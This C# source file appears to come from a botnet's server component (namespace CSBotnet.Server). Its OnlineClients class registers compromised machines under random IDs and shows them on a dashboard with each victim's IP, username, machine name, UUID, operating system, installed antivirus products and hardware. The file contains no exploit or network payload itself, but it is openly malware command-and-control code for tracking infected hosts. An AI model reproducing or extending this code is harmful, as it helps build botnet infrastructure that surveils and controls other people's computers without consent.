using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using static System.Net.Mime.MediaTypeNames;

namespace CSBotnet.Server
{
    class OnlineClients
    {
        public static ListView Dashboard;
        public static Dictionary<string, Client> Clients = new Dictionary<string, Client>();
        private static readonly Random _random = new Random();

        public static void Init(ListView dashboard)
        {
            Dashboard = dashboard;
        }

        public static void AddClient(Client client)
        {
            string Id = NewId(32);

            client.Id = Id;

            Clients.Add(Id, client);

            ImageList imageList = new ImageList();
            imageList.ImageSize = new Size(30, 18);
            imageList.Images.Add(client.CountryCode, System.Drawing.Image.FromFile(client.CountryFlagPath));

            Dashboard.Invoke(new Action(() => Dashboard.SmallImageList = imageList));

            ListViewItem item = new ListViewItem("");

            item.SubItems.Add(client.Ip);
            item.SubItems.Add(client.Username);
            item.SubItems.Add(client.MachineName);
            item.SubItems.Add(client.Id);
            item.SubItems.Add(client.UUID);
            item.SubItems.Add(client.Os);
            item.SubItems.Add(string.Join(", ", client.Antiviruses));
            item.SubItems.Add(client.GPU);
            item.SubItems.Add(client.CPU);
            item.SubItems.Add(client.RAM);

            item.ImageKey = client.CountryCode;

            Dashboard.Invoke(new Action(() => Dashboard.Items.Add(item)));
        }

        

        private static string NewId(int length = 16)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var sb = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                int index = _random.Next(chars.Length);
                sb.Append(chars[index]);
            }

            return sb.ToString();
        }
    }
}


